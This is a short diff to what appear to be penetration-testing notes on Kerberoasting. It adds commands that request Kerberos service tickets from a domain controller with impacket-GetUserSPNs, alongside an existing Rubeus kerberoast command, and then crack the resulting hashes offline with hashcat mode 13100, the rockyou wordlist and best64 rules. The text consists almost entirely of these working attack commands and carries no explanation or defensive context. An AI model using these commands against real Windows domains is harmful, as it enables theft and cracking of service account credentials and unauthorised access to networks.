@@ -1,3 +1,10 @@
 Use the TGS-REP mode
 
+# Via KALI:
+sudo impacket-GetUserSPNs -request -dc-ip 10.0.0.2 superalex.sec/user01
+
+# Via Win:
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+# Then:
+sudo hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
